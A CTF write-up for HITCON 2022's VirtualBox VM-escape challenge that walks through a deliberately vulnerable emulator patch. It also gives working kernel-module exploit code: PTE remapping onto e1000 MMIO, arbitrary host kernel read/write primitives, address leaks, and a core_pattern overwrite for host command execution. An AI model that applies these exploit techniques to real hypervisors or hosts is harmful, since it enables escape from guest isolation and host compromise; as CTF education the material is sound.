---
title: HITCON CTF 2022 -- Fourchain - Hypervisor
categories:
- write-ups
date: '2022-11-28 13:35:22'
tags:
- CTF
- Pwnable
- HITCON
- vm_escape
- VirtualBox
- kernel
---

## Intro

`Fourchain - Hypervisor` is a pwnable challenge created by Billy ( @st424204 ) for HITCON CTF 2022. It serves as the 4th stage of the Fourchain series -- a VM Escape challenge which requires challengers to escape a VirtualBox VM and achieve code execution on the host. 

As the challenge verifier, I spent lots of time learning VirtualBox internal and developing exploits. Although the vulnerability is obvious, it's still not an easy task to solve, and I learned tons of stuff while trying to solve it. Here in this post I'll share the solutions and other details of this challenge, including three different methods I used for exploitation. You can find all my exploit kernel module in [this link](https://gist.github.com/bruce30262/bcb1f78db231bc082f12adb7510a9973). Feel free to correct me if I got something wrong in this post, since I'm a VirtualBox noob ( and still is TBH ) before I met this challenge. 

<!-- more -->

Before we start, I would like to apologize to teams that were effected by the hint we released at the 25th hr of the contest. I released the hint without asking the progress of this challenge, and it caused some complaining. Luckily it didn't effect the result too much, but still I made a mistake for not asking about the progress before releasing the hint. I'll do better next time and make sure this won't happen again.

Without further ado, let's get started !

## Patch analysis

```diff
diff -Naur VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h Chall/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h
--- VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h	2022-10-11 21:51:54.000000000 +0800
+++ Chall/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h	2022-11-02 19:18:19.196674293 +0800
@@ -20,7 +20,7 @@
 *   Global Variables                                                           *
 *******************************************************************************/
 extern const PFNIEMOP g_apfnOneByteMap[256]; /* not static since we need to forward declare it. */
-
+static uint64_t Table[0x10];
 #ifdef _MSC_VER
 # pragma warning(push)
 # pragma warning(disable: 4702) /* Unreachable code like return in iemOp_Grp6_lldt. */
@@ -538,6 +538,40 @@
     return IEMOP_RAISE_INVALID_OPCODE();
 }
 
+FNIEMOP_DEF(iemOp_ReadTable)
+{
+    if (pVCpu->iem.s.enmCpuMode == IEMMODE_64BIT && pVCpu->iem.s.uCpl == 0 )
+	{
+		IEM_MC_BEGIN(0, 2);
+		IEM_MC_LOCAL(uint64_t, u64Idx);
+		IEM_MC_FETCH_GREG_U64(u64Idx, X86_GREG_xBX);
+		IEM_MC_LOCAL_CONST(uint64_t, u64Value,/*=*/ Table[u64Idx]);
+		IEM_MC_STORE_GREG_U64(X86_GREG_xAX, u64Value);
+		IEM_MC_ADVANCE_RIP();
+		IEM_MC_END();
+		return VINF_SUCCESS;
+	}
+	return IEMOP_RAISE_INVALID_OPCODE();
+}
+
+
+FNIEMOP_DEF(iemOp_WriteTable)
+{
+    if (pVCpu->iem.s.enmCpuMode == IEMMODE_64BIT && pVCpu->iem.s.uCpl == 0 )
+	{
+		IEM_MC_BEGIN(0, 2);
+		IEM_MC_LOCAL(uint64_t, u64Idx);
+		IEM_MC_FETCH_GREG_U64(u64Idx, X86_GREG_xBX);
+		IEM_MC_LOCAL(uint64_t, u64Value);
+		IEM_MC_FETCH_GREG_U64(u64Value, X86_GREG_xAX);
+		Table[u64Idx] = u64Value;
+		IEM_MC_ADVANCE_RIP();
+		IEM_MC_END();
+		return VINF_SUCCESS;
+	}
+	return IEMOP_RAISE_INVALID_OPCODE();
+}
+
 
 /** Invalid with RM byte . */
 FNIEMOPRM_DEF(iemOp_InvalidWithRM)
diff -Naur VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructionsTwoByte0f.cpp.h Chall/src/VBox/VMM/VMMAll/IEMAllInstructionsTwoByte0f.cpp.h
--- VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructionsTwoByte0f.cpp.h	2022-10-11 21:51:55.000000000 +0800
+++ Chall/src/VBox/VMM/VMMAll/IEMAllInstructionsTwoByte0f.cpp.h	2022-11-02 16:18:35.752320732 +0800
@@ -9539,9 +9539,9 @@
     /* 0x22 */  iemOp_mov_Cd_Rd,            iemOp_mov_Cd_Rd,            iemOp_mov_Cd_Rd,            iemOp_mov_Cd_Rd,
     /* 0x23 */  iemOp_mov_Dd_Rd,            iemOp_mov_Dd_Rd,            iemOp_mov_Dd_Rd,            iemOp_mov_Dd_Rd,
     /* 0x24 */  iemOp_mov_Rd_Td,            iemOp_mov_Rd_Td,            iemOp_mov_Rd_Td,            iemOp_mov_Rd_Td,
-    /* 0x25 */  iemOp_Invalid,              iemOp_Invalid,              iemOp_Invalid,              iemOp_Invalid,
+    /* 0x25 */  iemOp_ReadTable,            iemOp_Invalid,              iemOp_Invalid,              iemOp_Invalid,
     /* 0x26 */  iemOp_mov_Td_Rd,            iemOp_mov_Td_Rd,            iemOp_mov_Td_Rd,            iemOp_mov_Td_Rd,
-    /* 0x27 */  iemOp_Invalid,              iemOp_Invalid,              iemOp_Invalid,              iemOp_Invalid,
+    /* 0x27 */  iemOp_WriteTable,           iemOp_Invalid,              iemOp_Invalid,              iemOp_Invalid,
     /* 0x28 */  iemOp_movaps_Vps_Wps,       iemOp_movapd_Vpd_Wpd,       iemOp_InvalidNeedRM,        iemOp_InvalidNeedRM,
     /* 0x29 */  iemOp_movaps_Wps_Vps,       iemOp_movapd_Wpd_Vpd,       iemOp_InvalidNeedRM,        iemOp_InvalidNeedRM,
     /* 0x2a */  iemOp_cvtpi2ps_Vps_Qpi,     iemOp_cvtpi2pd_Vpd_Qpi,     iemOp_cvtsi2ss_Vss_Ey,      iemOp_cvtsi2sd_Vsd_Ey,
```

The patch added two emulating function in IEM (Instruction Decoding and Emulation manager). IEM in VirtualBox is used for simulating the execution of small pieces of continuous guest code. The two emulating function is `iemOp_ReadTable` and `iemOp_WriteTable`, which is able to let us do arbitrary read/write in the host kernel ( and in user space, depends on how you trigger it ).

## How to trigger the vulnerable function
Our goal is to reach IEM and tell IEM to emulate the instruction `0x250f` ( iemOp_ReadTable ) and `0x270f` ( iemOp_WriteTable ) for us.

### How to reach IEM
To reach IEM and emulate the instruction, one of the way is using MMIO. MMIO allows a device to be mapped into the memory, so kernel can access its data by accessing the corresponded memory address.

Here's the calling sequence of VirtualBox emulating instructions in an MMIO address:

```
hmR0VmxExitEptMisconfig
 -> PGMR0Trap0eHandlerNPMisconfig
    -> iomMmioPfHandlerNew
      -> iomMmioCommonPfHandlerNew
        -> IEMExecOne ( Reach IEM )
```

### E1000 network adapter
One of the most common device is the e1000 network adapter. The device will be mapped into the system memory, we can use `cat /proc/iomem` to check its memory address ( require root ):

```
cat /proc/iomem
...............
...............
      fd5c0000-fd5dffff : e1000  <----- HERE
    fd5ef000-fd5effff : 0000:02:03.0
      fd5ef000-fd5effff : ehci_hcd
    fdff0000-fdffffff : 0000:02:01.0
      fdff0000-fdffffff : e1000
  fe000000-fe7fffff : 0000:00:0f.0
    fe000000-fe7fffff : vmwgfx probe
...............
...............
```

We can see that e1000 device has been mapped to `fd5c0000-fd5dffff`. To access the device, we'll need to use MMIO:

```cpp
#define E1000_MMIO_BASE 0xfd5c0000

int* addr = ioremap(E1000_MMIO_BASE,0x1000);
addr[0] = 0x41414141; // write to MMIO
```

e1000 has lots of "registers" that stores the data in the device. One of the way to know these registers is by checking the [Linux source code](https://elixir.bootlin.com/linux/v6.0.8/source/drivers/net/ethernet/intel/e1000/e1000_hw.h#L779):

```c
#define E1000_CTRL     0x00000	/* Device Control - RW */
#define E1000_CTRL_DUP 0x00004	/* Device Control Duplicate (Shadow) - RW */
#define E1000_STATUS   0x00008	/* Device Status - RO */
#define E1000_EECD     0x00010	/* EEPROM/Flash Control - RW */
#define E1000_EERD     0x00014	/* EEPROM Read - RW */
#define E1000_CTRL_EXT 0x00018	/* Extended Device Control - RW */
#define E1000_FLA      0x0001C	/* Flash Access - RW */
#define E1000_MDIC     0x00020	/* MDI Control - RW */
....................
```

Those `0x000XX` are the "offset" of the registers. For example, if we want to read the `E1000_STATUS` register, we just need to read the memory address `E1000_MMIO_BASE + 0x8` in kernel.

### The MMIO read/write handler in VirtualBox

In VirtualBox, since it doesn't really have the e1000 device, it'll have to emulate it. For example, when the kernel tries to read the `E1000_CTRL` register from e1000 device with MMIO, VirtualBox will have to emulate the behavior of "reading the E1000_CTRL register". 

Notice that reading/writing a register in e1000 isn't as simple as a four bytes read/write, sometimes it'll have to do some extra stuff. That's why VirtualBox has MMIO read/write handler -- so when guest tries to read/write a device with MMIO, it will use those handlers to emulate the behavior of reading/writing those devices.

VirtualBox defines the MMIO read/write handlers of the e1000 device in `src\VBox\Devices\Network\DevE1000.cpp` :

```cpp
/**
 * Register map table.
 *
 * Override pfnRead and pfnWrite to get register-specific behavior.
 */
static const struct E1kRegMap_st
{
    /** Register offset in the register space. */
    uint32_t   offset;
    /** Size in bytes. Registers of size > 4 are in fact tables. */
    uint32_t   size;
    /** Readable bits. */
    uint32_t   readable;
    /** Writable bits. */
    uint32_t   writable;
    /** Read callback. */
    FNE1KREGREAD *pfnRead;
    /** Write callback. */
    FNE1KREGWRITE *pfnWrite;
    /** Abbreviated name. */
    const char *abbrev;
    /** Full name. */
    const char *name;
} g_aE1kRegMap[E1K_NUM_OF_REGS] =
{
    /* offset  size     read mask   write mask  read callback            write callback            abbrev      full name                     */
    /*-------  -------  ----------  ----------  -----------------------  ------------------------  ----------  ------------------------------*/
    { 0x00000, 0x00004, 0xDBF31BE9, 0xDBF31BE9, e1kRegReadDefault      , e1kRegWriteCTRL         , "CTRL"    , "Device Control" },
    { 0x00008, 0x00004, 0x0000FDFF, 0x00000000, e1kRegReadDefault      , e1kRegWriteUnimplemented, "STATUS"  , "Device Status" },
    { 0x00010, 0x00004, 0x000027F0, 0x00000070, e1kRegReadEECD         , e1kRegWriteEECD         , "EECD"    , "EEPROM/Flash Control/Data" },
    { 0x00014, 0x00004, 0xFFFFFF10, 0xFFFFFF00, e1kRegReadDefault      , e1kRegWriteEERD         , "EERD"    , "EEPROM Read" },
    { 0x00018, 0x00004, 0xFFFFFFFF, 0xFFFFFFFF, e1kRegReadUnimplemented, e1kRegWriteUnimplemented, "CTRL_EXT", "Extended Device Control" },
    { 0x0001c, 0x00004, 0xFFFFFFFF, 0xFFFFFFFF, e1kRegReadUnimplemented, e1kRegWriteUnimplemented, "FLA"     , "Flash Access (N/A)" },
    { 0x00020, 0x00004, 0xFFFFFFFF, 0xFFFFFFFF, e1kRegReadDefault      , e1kRegWriteMDIC         , "MDIC"    , "MDI Control" },
    .............................................................
```

The data in the structure are:
* offset: The register offset ( e.g. `E1000_STATUS` -> 0x8 ).
* size: The data size that can be read/write. 
* read mask:
    * If it's `0x0000ffff`, then it means that only the low 16 bits will be read from the register.
* write mask:
    * Similar to read mask, except it's write.
* read callback & write callback
    * The read/write handler that handles the read/write of the register.
*  abbrev & full name: abbrev name & full name of the register.

So for example, if we write a value to the `E1000_CTRL` register inside a VirtualBox VM, VirtualBox will call `e1kRegWriteCTRL` to handle the writing.

### How IEM emulate instruction

Inside a VirtualBox VM, when it jumps to an MMIO address and tries to execute some code, VirtualBox will do the following:
* Use the MMIO read handler to fetch the instruction from an MMIO memory address.
* Decode and emulate that instruction.

So, in order to reach `iemOp_ReadTable` and `iemOp_WriteTable`, we'll have to:
* Jump to an MMIO address that is executable.
* The IEM should fetch the instruction from the MMIO address with a MMIO read handler. After fetching, the instruction should be `0x250f` or `0x270f`.

### Writing PoC

Here we pick e1000 as our target device. We'll try to write our instruction in its MMIO address and try execute it.

First is to pick a suitable MMIO read/write handler. VirtualBox defines lots of MMIO read/write handlers for e1000, and we'll have to pick one that suits our needs:

* It has to read/write the value directly from/to the register. No modification at all.
* Preferably the value in the register should only controlled by us and not being affected by other system behavior.

After looking at `g_aE1kRegMap`, it seems that the `Management Control` ( `E1000_MANC` ) register is a good target:

```
/* offset  size     read mask   write mask  read callback            write callback            abbrev      full name                     */
/*-------  -------  ----------  ----------  -----------------------  ------------------------  ----------  ------------------------------*/
{ 0x05820, 0x00004, 0xFFFFFFFF, 0xFFFFFFFF, e1kRegReadDefault      , e1kRegWriteDefault      , "MANC"    , "Management Control" },
````

* The read mask and write mask are both `0xffffffff`, nothing will be masked off.
* Both `e1kRegReadDefault` and `e1kRegWriteDefault` read/write the value directly without any modification.

So, we can put our instruction in the `E1000_MANC` register, then jump to the corresponded MMIO address so IEM will fetch and emulate our instruction, triggering `iemOp_ReadTable` and `iemOp_WriteTable`.


Here we'll write a driver that will do the things mentioned above. First, some functions for creating the driver:


```c
static int drv_open(struct inode *inode, struct file *filp);
static ssize_t drv_read(struct file *file, char __user *buf,size_t count, loff_t *ppos);

static struct file_operations drv_fops = {
    open : drv_open,
    read : drv_read
};

static int drv_open(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "In drv_open\n");
    return 0;
}

static struct miscdevice pwn_miscdev = {
    .minor      = 100,
    .name       = "pwn",
    .fops       = &drv_fops,
};


static ssize_t drv_read(struct file *file, char __user *buf,
			size_t count, loff_t *ppos) {
    
    /* We put our exploit here */
    printk(KERN_INFO "In drv_read\n");
    return 0;
}


int init_module(void) { 
    return misc_register(&pwn_miscdev); 
 
} 
 
void cleanup_module(void) { 
	misc_deregister(&pwn_miscdev); 
} 
 
MODULE_LICENSE("GPL");
```
{: file='test.c'}


A user space program for triggering the attack:

```c
#include <unistd.h>
#include <stdlib.h>

char buf[0x100];
int main(){
    system("insmod test.ko");
    int fd = open("/dev/pwn",2);
    read(fd,buf,1); // trigger drv_read
}
```
{: file='exp.c'}

Makefile:

```Makefile
obj-m += test.o 
CFLAGS_test.o := -masm=intel -w 
PWD := $(CURDIR) 
 
all: 
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
    gcc exp.c -w --static -o exp	
 
clean: 
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Now for the exploit. First, we use `ioremap` to map the MMIO of e1000 to the memory, and write our instruction ( we'll use `iemOp_ReadTable` in this case ) to the `E1000_MANC` register:

```c
#define E1000_MMIO_BASE 0xf0000000
#define RT 0x0000250f  // iemOp_ReadTable
#define WT 0x0000270f  // iemOp_WriteTable


static ssize_t drv_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) {
    
    /* We put our exploit here */
    
    printk(KERN_INFO "In drv_read\n");

    /* E1000_MANC: E1000_MMIO_BASE + 0x5820 */
    int* inst = ioremap(E1000_MMIO_BASE + 0x5000, 0x1000);
    inst[0x820/4] = RT; // iemOp_ReadTable
 
    return 0;
}
```

Now it's the tricky part. Before we jump to MMIO and execute our instruction, we'll need to convince the kernel that the memory address we're jumping is a valid kernel code memory. Here's how we do it:

```c
static size_t *to_page_entry(size_t cr3, size_t addr) {
    /* Get the PTE of addr */
    
    size_t idx, i;
    size_t val = cr3;
    for (i = 0; i < 4; i++) {
        val &= (0xfffffffff000UL); // physical address
        val += PAGE_OFFSET;        // alias page
        idx = addr >> (12 + (3 - i) * 9);
        idx &= ((1 << 9) - 1);
        if (i < 3)
            val = *((size_t *)(val + idx * 8));
        else
            return ((size_t *)(val + idx * 8));
    }
    return 0;
}

static ssize_t drv_read(struct file *file, char __user *buf,
			size_t count, loff_t *ppos) {
    // .......omitted....................

    char *code = kmalloc(0x1000, GFP_KERNEL); // [1]
    size_t cr3;

    asm(
        "mov %[val],cr3\r\n;"
        : [val] "=r"(cr3)::
    );

    size_t *ent = to_page_entry(cr3, (size_t)code); // [2]
    size_t *B = to_page_entry(cr3, (size_t)drv_read); // [3]
    *ent = (E1000_MMIO_BASE + 0x5000) | ((*B) & 0xff00000000000fffULL); // [4]
    
    // .......omitted....................
}
```

We first allocate a page called `code` ( [1] ). Then, we use the `to_page_entry` function to get the PTE ( P1 entry ) of `code` ( [2] ) and `drv_read` ( [3] ). We then modify the P1 entry of `code` to `E1000_MMIO_BASE + 0x5000` ( [4] ), so later when we access `code`, we'll be ended up in page `E1000_MMIO_BASE + 0x5000`, the one we just ioremap. The `| ((*B) & 0xff00000000000fffULL` is to mark the PTE's low 12 bits the same as `drv_read`, so kernel will think `code`'s page is executable.

Now we can setup some registers and jump to `code+0x820`, which will trigger `iemOp_ReadTable`:

```c
asm volatile(
        "mov rbx,0x41414141\r\n;" // the Table index
        "mov rcx,%[code]\r\n;" // code+0x820, which will ended up in E1000_MMIO_BASE + 0x5000 + 0x820 == E1000_MANC 
        "call rcx\r\n;" ::[code] "r"(code + 0x820) : "rax", "rbx", "rcx"
);
```

For `iemOp_WriteTable` is similar. We just write the instruction first :

```c
inst[0x820/4] = WT;
```

Create `code` and modify it's PTE, then write some assembly to trigger the function :

```c
asm volatile(
        "mov rbx,0x100\r\n;" // index
        "mov rax, 0x4141414141414141\r\n;" // write 0x4141414141414141
        "mov rcx,%[code]\r\n;"
        "call rcx\r\n;" ::[code] "r"(code + 0x820) : "rax", "rbx", "rcx"
);
```

Since this triggers the functions in host's kernel space, now we have OOB r/w in host's kernel memory.


## Exploitation
### Create arbitrary read/write primitives

We need to create some primitives so later we can use them to do some further attack. First we setup some functions so we can do `iemOp_ReadTable` and `iemOp_WriteTable` :

```c
#define E1000_MMIO_BASE 0xf0000000
#define RT 0x00c3250f
#define WT 0x00c3270f

#define sll signed long long

static size_t __attribute__((optimize("O0"))) read_table(int *inst, char *code, sll idx) {
    
    /* iemOp_ReadTable */
    
    inst[0x820/4] = RT;
    size_t ret;
    asm volatile(
            "mov rbx,%[idx]\r\n;"
            "mov rcx,%[code]\r\n;"
            "call rcx\r\n;"
            "mov %[ret], rax\r\n;"
            :[ret]"=r"(ret)
            :[idx]"r"(idx),[code]"r"(code+0x820)
            :"rax","rbx","rcx"
    );
    return ret;
}

static void __attribute__((optimize("O0"))) write_table(int *inst, char *code, sll idx, size_t val) {
    
    /* iemOp_WriteTable */
    
    inst[0x820/4] = WT;
    asm volatile(
            "mov rbx,%[idx]\r\n;"
            "mov rax,%[val]\r\n;"
            "mov rcx,%[code]\r\n;"
            "call rcx\r\n;"
            :
            :[idx]"r"(idx),[val]"r"(val),[code]"r"(code+0x820)
            :"rax","rbx","rcx"
    );
}

static ssize_t drv_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) {

    printk(KERN_INFO "In drv_read\n");
    
    /* E1000_MANC: E1000_MMIO_BASE + 0x5820 */
    int* inst = ioremap(E1000_MMIO_BASE+0x5000,0x1000);

    char* code = kmalloc(0x1000,GFP_KERNEL);
    size_t cr3;
    asm(
            "mov %[val],cr3\r\n;"
            :[val]"=r"(cr3)::
    );
    
    /* Modify code's PTE so code points to E1000_MMIO_BASE+0x5000 */
    size_t* ent = to_page_entry(cr3,(size_t)code);
    size_t* B = to_page_entry(cr3,(size_t)drv_read);
    *ent = (E1000_MMIO_BASE+0x5000) | ( (*B)&0xff00000000000fffULL);    
    // Do read/write table
    sll idx = <some index>;
    size_t val = <some value>;
    write_table(inst, code, idx, val);
    read_table(inst, code, idx);
    
    return 0;
}
```

Notice that we have to write `"\x0f\x25\xc3"` into `E1000_MANC` if we want to do `iemOp_ReadTable`. The `\xc3` ( `ret` ) is for returning to our kernel code after doing `\x0f\x25`. The same applies to `iemOp_WriteTable`. Also the `__attribute__((optimize("O0")))` is to tell gcc don't optimize those functions into `drv_read`. I found that if the optimization was on, the compiled code will be incorrect ( it somehow optimized the `WT` instruction, making us unable to do `iemOp_WriteTable` ).

Now we can use `read_table` to leak some address. We first leak the base address of `VMMR0.r0` by reading the GOT of `iemAImpl_mul_u8` : 

```c
// leak VMMR0.r0's base
sll off_table = 0x1FC060; // table's offset in VMMR0.r0
sll off_iemAImpl_mul_u8 = 0x1dacd0; // iemAImpl_mul_u8's got in VMMR0.r0
size_t vmmr0_base = read_table(inst, code, (off_iemAImpl_mul_u8 - off_table)>>3 ) - 0x11a6a8;
printk(KERN_INFO "vmmr0_base: %px\n", vmmr0_base);
```

Note that we'll need to use `%px` in `printk` in order to print out the 64 bits hex value, ( `%p` only print out 32 bits ).

Now with `VMMR0.r0`'s base address, we can know the memory address of `table`. Using this information we can then create kernel arbitrary read/write primitives:

```c
sll table;

static size_t __attribute__((optimize("O0"))) arb_read(int *inst, char *code, sll addr) {
    
    /* arbitrary read */
    
    return read_table( inst, code, (addr - table)>>3 );
}

static void __attribute__((optimize("O0"))) arb_write(int *inst, char *code, sll addr, size_t val) {
    
    /* arbitrary write */
    
    return write_table( inst, code, (addr - table)>>3, val );
}

table = vmmr0_base + off_table;
// Do kernel arbitrary read/write
addr = <some kernel address>;
arb_read(inst, code, addr);
arb_write(inst, code, addr, val);
```

Now we can read/write arbitrary kernel memory.

### Leaking kernel's base and overwrite core_pattern

The plan is to leak the kernel's base address and overwrite `/proc/sys/kernel/core_pattern` into our own command, so later when VirtualBox crash in ring-3, we'll be able to execute the command with root privilege. 

To get the kernel's base address, I first leak `vboxdrv.ko`'s base address by reading `SUPR0EnableVTx@got.plt` in `VMMR0.r0` ( `SUPR0EnableVTx` is a function in `vboxdrv.ko` ).

```c
size_t got_SUPR0EnableVTx = vmmr0_base + 0x1DB018; // SUPR0EnableVTx@got.plt
size_t vboxdrv_base = arb_read(inst, code, (sll)got_SUPR0EnableVTx) - 0x8a0;
printk(KERN_INFO "vboxdrv_base: %px\n", vboxdrv_base);
```

I then use `vboxdrv_base` to get the kernel's base address. Here's how I leak it:

* At `vboxdrv.ko + 0x15a8a`, there's a `jmp` instruction which will jump to `kfree`, a function in kernel.
* The instruction in machine code is `E9 <4 byte offset>`.
* By reading that 4 byte offset and do some calculation, we'll know where `kfree` actually is, and thus calculate the kernel base address.


```c
// read the 4 byte offset
size_t tmp = arb_read(inst, code, (sll)(vboxdrv_base+0x15a8a+1));
tmp = (tmp >> 24)&0xffffffff; // tmp = 4 byte offset
printk(KERN_INFO "tmp: %px\n", tmp);
signed int kfree_offset = (signed int)(tmp);
printk(KERN_INFO "kfree_offset: %d\n", kfree_offset);
// calculate kernel base
size_t kernel_base = vboxdrv_base + 0x15a8a + 5 + kfree_offset - 0x2a2af0;
printk(KERN_INFO "kernel_base: %px\n", kernel_base);
```

We can now try overwrite `core_pattern` with arbitrary write primitive. Here I create a `write_string` primitive so I can write string into arbitrary kernel address more conveniently:

```c
static void __attribute__((optimize("O0"))) write_string(int *inst, char *code, sll addr, char* string) {
    int i = 0, cnt = 0, written = 0; 
    size_t val = 0;
    int sz = strlen(string);
    for (i = 0 ; i < sz+1 ; i++) { // to strlen(data)+1 so null byte will be written as well
        val = val | (((size_t)string[i] & 0xff) << ( (i & 7) * 8 ));
        if( (i & 7) == 7 ) {
            arb_write(inst, code, (sll)(addr + (cnt*8)), val);
            cnt++;
            val = 0;
            written = 1;
        } else {
            written = 0;
        }
    }
    if(written == 0) { // need to write one last time
        arb_write(inst, code, (sll)(addr + (cnt*8)), val);
    }
}
```

Overwrite `core_pattern` in kernel:

```c
size_t core_pattern = kernel_base + 0x17770c0; 
write_string(inst, code, (sll)core_pattern, "|/usr/bin/touch /tmp/123");
```

After that, once we're able to crash VirtualBox in ring-3, we should be able to see a file `123` being created under `/tmp`. The problem now is how do we trigger a crash in ring-3 ?

### Triggering crash in ring-3 and get code execution

So in VirtualBox there're actually memories that are being mapped into both kernel space and user space. Such memory may have different virtual address in ring-0 and ring-3, but they both point to the same physical frame, so modifying the memory in ring-0 will affect the one in ring-3. If we can find such memory, and it has some pointers in it, we can modify those pointers in ring-0, and crash VirtualBox in ring-3 when it tries to access such pointer. ( We can't access the user space memory in ring-0 due to the SMAP protection, so we'll have to modify the one in kernel space ).

So how do we find such memory ? We can search "user space" in the source code of `vboxdrv`, which will give us some direction :

```c
// vboxhost/vboxdrv/SUPDrvGip.c
/**
 * Maps the GIP into userspace and/or get the physical address of the GIP.
 *
 * @returns IPRT status code.
 * @param   pSession        Session to which the GIP mapping should belong.
 * @param   ppGipR3         Where to store the address of the ring-3 mapping. (optional)
 * @param   pHCPhysGip      Where to store the physical address. (optional)
 *
 * @remark  There is no reference counting on the mapping, so one call to this function
 *          count globally as one reference. One call to SUPR0GipUnmap() is will unmap GIP
 *          and remove the session as a GIP user.
 */
SUPR0DECL(int) SUPR0GipMap(PSUPDRVSESSION pSession, PRTR3PTR ppGipR3, PRTHCPHYS pHCPhysGip) {
    // ...............omitted............................
    rc = RTR0MemObjMapUser(&pSession->GipMapObjR3, pDevExt->GipMemObj, (RTR3PTR)-1, 0, RTMEM_PROT_READ, NIL_RTR0PROCESS);
    // ...............omitted............................
}
```

By reading the source code, we can know that VirtualBox is using `RTR0MemObjMapUser` to map an kernel memory object into user space. By searching `RTR0MemObjMapUser` through the VirtualBox source code, we'll be able to know what kind of object are being mapped into both kernel space and user space. I was able to find some useful information in function `IOMR0MmioGrowRegistrationTables`:


```c
// src/VBox/VMM/VMMR0/IOMR0Mmio.cpp
/**
 * Grows the MMIO registration (all contexts) and lookup tables.
 *
 * @returns VBox status code.
 * @param   pGVM            The global (ring-0) VM structure.
 * @param   cReqMinEntries  The minimum growth (absolute).
 * @thread  EMT(0)
 * @note    Only callable at VM creation time.
 */
VMMR0_INT_DECL(int) IOMR0MmioGrowRegistrationTables(PGVM pGVM, uint64_t cReqMinEntries)
{
     
    // ...............omitted.....................
    /*
     * Allocate the new tables.  We use a single allocation for the three tables (ring-0,
     * ring-3, lookup) and does a partial mapping of the result to ring-3.
     */
    uint32_t const cbRing0  = RT_ALIGN_32(cNewEntries * sizeof(IOMMMIOENTRYR0),     PAGE_SIZE);
    uint32_t const cbRing3  = RT_ALIGN_32(cNewEntries * sizeof(IOMMMIOENTRYR3),     PAGE_SIZE);
    uint32_t const cbShared = RT_ALIGN_32(cNewEntries * sizeof(IOMMMIOLOOKUPENTRY), PAGE_SIZE);
    uint32_t const cbNew    = cbRing0 + cbRing3 + cbShared;

    /* Use the rounded up space as best we can. */
    cNewEntries = RT_MIN(RT_MIN(cbRing0 / sizeof(IOMMMIOENTRYR0), cbRing3 / sizeof(IOMMMIOENTRYR3)),
                         cbShared / sizeof(IOMMMIOLOOKUPENTRY));

    RTR0MEMOBJ hMemObj;
    int rc = RTR0MemObjAllocPage(&hMemObj, cbNew, false /*fExecutable*/);
    if (RT_SUCCESS(rc))
    {
        /*
         * Zero and map it.
         */
        RT_BZERO(RTR0MemObjAddress(hMemObj), cbNew);

        RTR0MEMOBJ hMapObj;
        // [1]
        rc = RTR0MemObjMapUserEx(&hMapObj, hMemObj, (RTR3PTR)-1, PAGE_SIZE, RTMEM_PROT_READ | RTMEM_PROT_WRITE,
                                 RTR0ProcHandleSelf(), cbRing0, cbNew - cbRing0);
        if (RT_SUCCESS(rc))
        {
            PIOMMMIOENTRYR0       const paRing0    = (PIOMMMIOENTRYR0)RTR0MemObjAddress(hMemObj);
            PIOMMMIOENTRYR3       const paRing3    = (PIOMMMIOENTRYR3)((uintptr_t)paRing0 + cbRing0);
            PIOMMMIOLOOKUPENTRY   const paLookup   = (PIOMMMIOLOOKUPENTRY)((uintptr_t)paRing3 + cbRing3);
            RTR3UINTPTR           const uAddrRing3 = RTR0MemObjAddressR3(hMapObj);

// ...............omitted.....................

            /*
             * Update the variables.
             */
            pGVM->iomr0.s.paMmioRegs      = paRing0;
            pGVM->iomr0.s.paMmioRing3Regs = paRing3; //[2]
            pGVM->iomr0.s.paMmioLookup    = paLookup;
            pGVM->iom.s.paMmioRegs        = uAddrRing3; //[3]
            pGVM->iom.s.paMmioLookup      = uAddrRing3 + cbRing3;
            pGVM->iom.s.cMmioAlloc        = cNewEntries;
            pGVM->iomr0.s.cMmioAlloc      = cNewEntries;

// ...............omitted.....................

    return rc;
}
```

Basically it mapped the MMIO registration table into ring-0 and ring-3 ( [1] ). At [2] and [3], it stores the memory address into a structure. `paRing3` is the kernel space address, while `uAddrRing3` is the user space address. Both address points to the same physical frame, so modifying content in `paRing3` will affect the content in  `uAddrRing3` as well.

So how do we find those address ? Since the address are stored inside the `pGVM` structure, we can try to find where `pGVM` is. After searching through the source code, we can conclude the following information:

```c
// src/VBox/VMM/VMMR0/GVMMR0.cpp

static PGVMM g_pGVMM = NULL;

/**
 * The GVMM instance data.
 */
typedef struct GVMM
{
    //...............omitted.........................
    /** The handle array.
     * The size of this array defines the maximum number of currently running VMs.
     * The first entry is unused as it represents the NIL handle. */
    GVMHANDLE           aHandles[GVMM_MAX_HANDLES];
    //...............omitted.........................
} GVMM;
/** Pointer to the GVMM instance data. */
typedef GVMM *PGVMM;


/**
 * Global VM handle.
 */
typedef struct GVMHANDLE
{
    //...............omitted.........................
    /** The pointer to the ring-0 only (aka global) VM structure. */
    PGVM                pGVM;
     //...............omitted.........................
} GVMHANDLE;
```

Basically, structure `GVMM` contains the `GVMHANDLE` member, which is a structure that contains `pGVM`. `GVMM` is actually a global variable ( `g_pGVMM` ) in `VMMR0.r0`. Since we already have the base address of `VMMR0.r0`, we can get the address of `g_pGVMM` and traverse the structure till we get `pGVM`, then leak the address of `pGVM->iomr0.s.paMmioRing3Regs` ( `paRing3` ) and `pGVM->iom.s.paMmioRegs` ( `uAddrRing3` ).

```c
size_t g_pGVMM = arb_read(inst, code, (sll)(vmmr0_base + 0x1E9E68));
printk(KERN_INFO "g_pGVMM: %px\n", g_pGVMM);

size_t pGVM = arb_read(inst, code, (sll)(g_pGVMM + 0xb8 + 0x8)); // g_pGVMM->aHandles[1]->pGVM
printk(KERN_INFO "pGVM: %px\n", pGVM);

// leak pGVM->iom.s.paMmioRegs (r3Map) & pGVM->iomr0.s.paMmioRing3Regs (r0Map)
size_t r0Map = arb_read(inst, code, (sll)(pGVM + 65352)); // paRing3
size_t r3Map = arb_read(inst, code, (sll)(pGVM + 44152)); // uAddrRing3
printk(KERN_INFO "r0Map: %px\n", r0Map);
printk(KERN_INFO "r3Map: %px\n", r3Map);
```

